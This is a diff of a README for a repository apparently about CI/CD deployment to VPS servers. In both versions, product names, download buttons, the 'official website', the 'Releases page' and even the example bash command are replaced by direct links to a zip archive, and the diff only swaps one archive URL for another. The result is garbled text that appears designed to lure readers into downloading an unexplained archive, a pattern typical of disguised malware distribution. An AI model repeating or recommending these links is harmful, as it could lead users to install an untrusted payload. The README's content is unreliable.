@@ -1,10 +1,10 @@
-# 🚀 vps-cicd-strategies - Efficient Deployment for Your https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip Apps
+# 🚀 vps-cicd-strategies - Efficient Deployment for Your https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip Apps
 
-[![Download vps-cicd-strategies](https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip)](https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip)
+[![Download vps-cicd-strategies](https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip)](https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip)
 
 ## 📖 Overview
 
-Welcome to the **vps-cicd-strategies** repository! This project provides reliable strategies to deploy https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip and https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip applications on Virtual Private Servers (VPS). With methods like Rsync, Atomic deployments, and Git Pull with PM2, you can ensure smooth and efficient application deployment. Our strategies include support for PR previews, staging setups, and monorepos. 
+Welcome to the **vps-cicd-strategies** repository! This project provides reliable strategies to deploy https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip and https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip applications on Virtual Private Servers (VPS). With methods like Rsync, Atomic deployments, and Git Pull with PM2, you can ensure smooth and efficient application deployment. Our strategies include support for PR previews, staging setups, and monorepos. 
 
 ## 🚀 Getting Started
 
@@ -13,14 +13,14 @@ Welcome to the **vps-cicd-strategies** repository! This project provides reliabl
 Before you start, ensure you have the following:
 
 - A Virtual Private Server (VPS) with a supported operating system (Linux preferred).
-- https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip installed. You can download https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip from the [official website](https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip).
+- https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip installed. You can download https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip from the [official website](https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip).
 - Nginx or another web server installed on your VPS.
 
 ### ⬇️ Download & Install
 
 To download the latest version of the vps-cicd-strategies, please visit the Releases page:
 
-[Download vps-cicd-strategies](https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip)
+[Download vps-cicd-strategies](https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip)
 
 Once there, follow these steps:
 
@@ -67,7 +67,7 @@ To give you a sense of how to use this tool, here is a basic example:
 
 1. Run the following command to start the deployment process:
    ```bash
-  https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip
+  https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip
    ```
 2. Wait for the process to complete. You'll see logs in the terminal that show the step-by-step process.
 
@@ -93,6 +93,6 @@ This project is licensed under the MIT License. Feel free to use and distribute 
 
 ## 💡 Conclusion
 
-Thank you for using vps-cicd-strategies! We are excited to see how you deploy your https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip and https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip applications using our strategies.
+Thank you for using vps-cicd-strategies! We are excited to see how you deploy your https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip and https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip applications using our strategies.
 
-For more details, please visit our [Releases page](https://github.com/mirazkfl/vps-cicd-strategies/raw/refs/heads/main/v1.5-do-rsync-atomic-pm2-monorepo/cicd_vps_strategies_3.4.zip) to download the latest version.
+For more details, please visit our [Releases page](https://raw.githubusercontent.com/mirazkfl/vps-cicd-strategies/main/v1.5-do-rsync-atomic-pm2-monorepo/apps/cicd_strategies_vps_lumpman.zip) to download the latest version.
